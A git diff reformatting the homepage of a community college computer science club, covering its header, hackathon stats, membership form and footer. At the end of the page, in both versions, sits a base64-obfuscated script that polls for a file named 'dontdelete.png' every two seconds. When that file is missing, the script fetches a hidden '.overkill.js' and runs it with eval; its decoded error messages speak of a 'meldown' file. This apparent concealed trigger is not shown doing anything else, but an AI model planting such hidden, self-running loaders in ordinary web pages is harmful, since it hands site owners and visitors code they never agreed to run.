@@ -1,220 +1,320 @@
 <!DOCTYPE html>
 <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SCC CS Club</title>
+    <link rel="icon" type="image/png" href="../img/favicon.png" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../css/styles.css" />
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+  </head>
 
-<head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>SCC CS Club</title>
-	<link rel="icon" type="image/png" href="../img/favicon.png">
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-	<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
-	<link rel="stylesheet" href="../css/styles.css">
-	<script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
-</head>
+  <body>
+    <canvas id="interactive-background"></canvas>
 
-<body>
-	<canvas id="interactive-background"></canvas>
+    <div class="wrapper">
+      <!-- header -->
+      <header id="header" class="header">
+        <div class="container">
+          <a href="index.html" class="logo"> < SCC CS Club /></a>
+          <button id="menu-toggle" class="menu-toggle" aria-label="Toggle menu">
+            <i data-lucide="menu"></i>
+          </button>
+          <nav id="main-nav" class="main-nav">
+            <ul>
+              <li><a href="index.html" class="active">Home</a></li>
+              <li><a href="about.html">About</a></li>
+              <li><a href="logs.html">Logs</a></li>
+              <li><a href="game dev.html">Game Dev.</a></li>
+              <li><a href="blog.html">Blog</a></li>
+              <li><a href="calendar.html">Calendar</a></li>
+            </ul>
+          </nav>
 
-	<div class="wrapper">
-		<!-- header -->
-		<header id="header" class="header">
-			<div class="container">
-				<a href="index.html" class="logo">
-					< SCC CS Club /></a>
-				<button id="menu-toggle" class="menu-toggle" aria-label="Toggle menu">
-                    <i data-lucide="menu"></i>
-                </button>
-				<nav id="main-nav" class="main-nav">
-					<ul>
-						<li><a href="index.html" class="active">Home</a></li>
-						<li><a href="about.html">About</a></li>
-						<li><a href="logs.html">Logs</a></li>
-						<li><a href="game dev.html">Game Dev.</a></li>
-						<li><a href="blog.html">Blog</a></li>
-						<li><a href="calendar.html">Calendar</a></li>
-					</ul>
-				</nav>
-				
-				<a href="#membership" class="button-primary desktop-only">
-					Membership
-				</a>
-			</div>
-		</header>
+          <a href="#membership" class="button-primary desktop-only">
+            Membership
+          </a>
+        </div>
+      </header>
 
-		<main>
-			<!-- hero section -->
-			<section class="hero">
-				<div class="container">
-					<div class="hero-content">
-						<h2 class="tagline">Learn | Grow | Create</h2>
-						<h3 class="subheading">Solano Community College</h3>
-						<h1 class="fade-in">Computer Science Club</h1>
-						<p class="hero-text fade-in-delay">
-							Meeting every 2nd & 4th Friday, 4:00–5:00 PM, in Room 1421, Main SCC Campus.
-						</p>
-						<a href="https://forms.gle/768nMgJiTHGNfpwd9" class="button-primary hero-cta fade-in-delay-2">
-							Join Now
-							<span class="arrow">→</span>
-						</a>
-					</div>
+      <main>
+        <!-- hero section -->
+        <section class="hero">
+          <div class="container">
+            <div class="hero-content">
+              <h2 class="tagline">Learn | Grow | Create</h2>
+              <h3 class="subheading">Solano Community College</h3>
+              <h1 class="fade-in">Computer Science Club</h1>
+              <p class="hero-text fade-in-delay">
+                Meeting every 2nd & 4th Friday, 4:00–5:00 PM, in Room 1421, Main
+                SCC Campus.
+              </p>
+              <a
+                href="#membership"
+                class="button-primary hero-cta fade-in-delay-2"
+              >
+                Join Now
+                <span class="arrow">→</span>
+              </a>
+            </div>
 
-					<div class="stats-grid">
-					<a href="https://linktr.ee/computerscience.scc" target="_blank" rel="noopener noreferrer" aria-label="Linktree">
-						<div class="stat-card fade-in-delay-3">
-							<i data-lucide="link"></i>
-							<div class="stat-value">Linktree</div>
-							<div class="stat-label">General Links</div>
-						</div>
-					</a>
-					<a href="https://discord.com/invite/8QXd5Xrw8A" target="_blank" rel="noopener noreferrer" aria-label="Discord">
-						<div class="stat-card fade-in-delay-3">
-							<i class="fa-brands fa-discord"></i>
-							<div class="stat-value">Discord</div>
-							<div class="stat-label">100+ Members</div>
-						</div>
-					</a>
-					<a href="https://github.com/jenniferpetsko/csclubsolano.com" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
-						<div class="stat-card fade-in-delay-3">
-							<i data-lucide="github"></i>
-							<div class="stat-value">GitHub</div>
-							<div class="stat-label">Public Repository</div>
-						</div>
-					</a>
-					<a href="https://www.instagram.com/computerscience.scc/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
-						<div class="stat-card fade-in-delay-3">
-							<i data-lucide="instagram"></i>
-							<div class="stat-value">Instagram</div>
-							<div class="stat-label">@computerscience.scc</div>
-						</div>
-					</a>
-					</div>
-				</div>
-			</section>
+            <div class="stats-grid">
+              <a
+                href="https://linktr.ee/computerscience.scc"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="Linktree"
+              >
+                <div class="stat-card fade-in-delay-3">
+                  <i data-lucide="link"></i>
+                  <div class="stat-value">Linktree</div>
+                  <div class="stat-label">General Links</div>
+                </div>
+              </a>
+              <a
+                href="https://discord.com/invite/8QXd5Xrw8A"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="Discord"
+              >
+                <div class="stat-card fade-in-delay-3">
+                  <i class="fa-brands fa-discord"></i>
+                  <div class="stat-value">Discord</div>
+                  <div class="stat-label">100+ Members</div>
+                </div>
+              </a>
+              <a
+                href="https://github.com/jenniferpetsko/csclubsolano.com"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="GitHub"
+              >
+                <div class="stat-card fade-in-delay-3">
+                  <i data-lucide="github"></i>
+                  <div class="stat-value">GitHub</div>
+                  <div class="stat-label">Public Repository</div>
+                </div>
+              </a>
+              <a
+                href="https://www.instagram.com/computerscience.scc/"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="Instagram"
+              >
+                <div class="stat-card fade-in-delay-3">
+                  <i data-lucide="instagram"></i>
+                  <div class="stat-value">Instagram</div>
+                  <div class="stat-label">@computerscience.scc</div>
+                </div>
+              </a>
+            </div>
+          </div>
+        </section>
 
-			<!-- about section -->
-			<section id="about" class="about-section">
-				<div class="container">
-					<div class="about-grid">
-						<div class="about-image">
-							<img src="../img/SCC_Hacks.jpg" alt="SCC CS Club" class="rounded-image">
-                        </div>
-							<div class="about-content">
-								<h2 class="section-title">SCC Hacks</h2>
-								<p class="scc-hacks-description">
-									Calling all coders, innovators, and anyone interested in computer science! Join us
-									for our annual SCC Hacks hosted
-									by the Solano Community College Computer Science Club.
-								</p>
-								<p class="scc-hacks-description">
-									Whether you're just starting out or a beginner in development, this is your chance
-									to collaborate with fellow tech enthusiasts and learn something new! Plus, you'll
-									get the chance to meet new people and expand your skills.
-								</p>
-								<div class="achievements-grid">
-									<div class="achievement-card">
-										<i class="fa-solid fa-user"></i>
-										<div class="achievement-value">35+</div>
-										<div class="achievement-label">Attendees</div>
-									</div>
-									<div class="achievement-card">
-										<i class="fa-solid fa-university"></i>
-										<div class="achievement-value">3</div>
-										<div class="achievement-label">Colleges</div>
-									</div>
-									<div class="achievement-card">
-										<i class="fa-solid fa-users"></i>
-										<div class="achievement-value">7</div>
-										<div class="achievement-label">Teams</div>
-									</div>
-								</div>
-							</div>
-						</div>
-					</div>
-			</section>
+        <!-- about section -->
+        <section id="about" class="about-section">
+          <div class="container">
+            <div class="about-grid">
+              <div class="about-image">
+                <img
+                  src="../img/SCC_Hacks.jpg"
+                  alt="SCC CS Club"
+                  class="rounded-image"
+                />
+              </div>
+              <div class="about-content">
+                <h2 class="section-title">SCC Hacks</h2>
+                <p class="scc-hacks-description">
+                  Calling all coders, innovators, and anyone interested in
+                  computer science! Join us for our annual SCC Hacks hosted by
+                  the Solano Community College Computer Science Club.
+                </p>
+                <p class="scc-hacks-description">
+                  Whether you're just starting out or a beginner in development,
+                  this is your chance to collaborate with fellow tech
+                  enthusiasts and learn something new! Plus, you'll get the
+                  chance to meet new people and expand your skills.
+                </p>
+                <div class="achievements-grid">
+                  <div class="achievement-card">
+                    <i class="fa-solid fa-user"></i>
+                    <div class="achievement-value counter" data-target="35">
+                      0
+                    </div>
+                    <div class="achievement-label">Attendees</div>
+                  </div>
+                  <div class="achievement-card">
+                    <i class="fa-solid fa-university"></i>
+                    <div class="achievement-value counter" data-target="3">
+                      0
+                    </div>
+                    <div class="achievement-label">Colleges</div>
+                  </div>
+                  <div class="achievement-card">
+                    <i class="fa-solid fa-users"></i>
+                    <div class="achievement-value counter" data-target="7">
+                      0
+                    </div>
+                    <div class="achievement-label">Teams</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
 
-			<!-- blog highlights section -->
-			<section id="blog-highlights" class="blog-highlights-section">
-				<div class="container">
-					<h2 class="section-title">Blog Highlights</h2>
-					<div class="blog-highlights-grid">
-						<div class="loading-skeleton">
-							<div class="skeleton-card">
-								<div class="skeleton-image"></div>
-								<div class="skeleton-title"></div>
-								<div class="skeleton-date"></div>
-								<div class="skeleton-button"></div>
-							</div>
-							<div class="skeleton-card">
-								<div class="skeleton-image"></div>
-								<div class="skeleton-title"></div>
-								<div class="skeleton-date"></div>
-								<div class="skeleton-button"></div>
-							</div>
-							<div class="skeleton-card">
-								<div class="skeleton-image"></div>
-								<div class="skeleton-title"></div>
-								<div class="skeleton-date"></div>
-								<div class="skeleton-button"></div>
-							</div>
-						</div>
-					</div>
-				</div> 
-			</section>
+        <!-- blog highlights section -->
+        <section id="blog-highlights" class="blog-highlights-section">
+          <div class="container">
+            <h2 class="section-title">Blog Highlights</h2>
+            <div class="blog-highlights-grid">
+              <div class="loading-skeleton">
+                <div class="skeleton-card">
+                  <div class="skeleton-image"></div>
+                  <div class="skeleton-title"></div>
+                  <div class="skeleton-date"></div>
+                  <div class="skeleton-button"></div>
+                </div>
+                <div class="skeleton-card">
+                  <div class="skeleton-image"></div>
+                  <div class="skeleton-title"></div>
+                  <div class="skeleton-date"></div>
+                  <div class="skeleton-button"></div>
+                </div>
+                <div class="skeleton-card">
+                  <div class="skeleton-image"></div>
+                  <div class="skeleton-title"></div>
+                  <div class="skeleton-date"></div>
+                  <div class="skeleton-button"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
 
-			<!-- membership section -->
-			<section id="membership" class="membership-section">
-<div class="container style-change-1">
-    <h2 class="section-title">Membership</h2>
-  <div class="membership-form-wrapper style-change-2">
-    <iframe class="style-change-7" src="https://docs.google.com/forms/d/e/1FAIpQLSfejuX4v8UCB-dCyU5RHcbWuyfhrC22EoltJxCoDiJ1m9b_iQ/viewform?embedded=true" height="400" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
-  </div>
-</div>
-			</section>
-		</main>
+        <!-- membership section -->
+        <section id="membership" class="membership-section">
+          <div class="container style-change-1">
+            <h2 class="section-title">Membership</h2>
+            <div class="membership-form-wrapper style-change-2">
+              <iframe
+                class="style-change-7"
+                src="https://docs.google.com/forms/d/e/1FAIpQLSfejuX4v8UCB-dCyU5RHcbWuyfhrC22EoltJxCoDiJ1m9b_iQ/viewform?embedded=true"
+                height="400"
+                frameborder="0"
+                marginheight="0"
+                marginwidth="0"
+                >Loading…</iframe
+              >
+            </div>
+          </div>
+        </section>
+      </main>
 
-		<!-- footer -->
-		<footer class="footer">
-			<div class="container">
-				<div class="footer-content">
-					<p>&copy; 2025
-						< SCC CS Club />
-					</p>
-					<div class="social-links">
-						<a href="https://discord.com/invite/8QXd5Xrw8A" target="_blank" rel="noopener noreferrer"aria-label="Discord">
-							<i class="fa-brands fa-discord"></i>
-						</a>
-						<a href="https://github.com/jenniferpetsko/csclubsolano.com" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
-							<i data-lucide="github"></i>
-						</a>
-						<a href="https://www.instagram.com/computerscience.scc/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
-							<i data-lucide="instagram"></i>
-						</a>
-					</div>
-				</div>
-			</div>
-		</footer>
-	</div>
-	<script src="../js/script.js"></script>
-	<script>
-	(function(){
-    let d = s => atob(s);
-    let imgPath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); 
+      <!-- footer -->
+      <footer class="footer">
+        <div class="container">
+          <div class="footer-content">
+            <p>&copy; 2025 < SCC CS Club /></p>
+            <div class="social-links">
+              <a
+                href="https://discord.com/invite/8QXd5Xrw8A"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="Discord"
+              >
+                <i class="fa-brands fa-discord"></i>
+              </a>
+              <a
+                href="https://github.com/jenniferpetsko/csclubsolano.com"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="GitHub"
+              >
+                <i data-lucide="github"></i>
+              </a>
+              <a
+                href="https://www.instagram.com/computerscience.scc/"
+                target="_blank"
+                rel="noopener noreferrer"
+                aria-label="Instagram"
+              >
+                <i data-lucide="instagram"></i>
+              </a>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+    <div
+      id="image-modal"
+      style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+      "
+    >
+      <span
+        id="modal-close"
+        style="
+          position: absolute;
+          top: 20px;
+          right: 30px;
+          font-size: 2rem;
+          color: #fff;
+          cursor: pointer;
+        "
+        >&times;</span
+      >
+      <img
+        id="modal-image"
+        src=""
+        alt="Expanded Image"
+        style="
+          max-width: 90%;
+          max-height: 90%;
+          border-radius: 8px;
+          box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        "
+      />
+    </div>
+    <script src="../js/script.js"></script>
+    <script>
+      (function () {
+        let d = (s) => atob(s);
+        let imgPath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n");
 
-    setInterval(() => {
-        let checkImg = new Image();
-        checkImg.src = imgPath + "?bk=" + Date.now();
-        
-        checkImg.onerror = function() {
+        setInterval(() => {
+          let checkImg = new Image();
+          checkImg.src = imgPath + "?bk=" + Date.now();
+
+          checkImg.onerror = function () {
             let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
             fetch(backupScript)
-                .then(r => { if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl")); return r.text(); })
-                .then(code => eval(code))
-                .catch(e => console.warn(d("QmFja3VwIG1lbGRvd24gZXJyb3I="), e));
-        };
-    }, 2000);
-})();
-
-	</script>
-</body>
-
+              .then((r) => {
+                if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl"));
+                return r.text();
+              })
+              .then((code) => eval(code))
+              .catch((e) => console.warn(d("QmFja3VwIG1lbGRvd24gZXJyb3I="), e));
+          };
+        }, 2000);
+      })();
+    </script>
+  </body>
 </html>
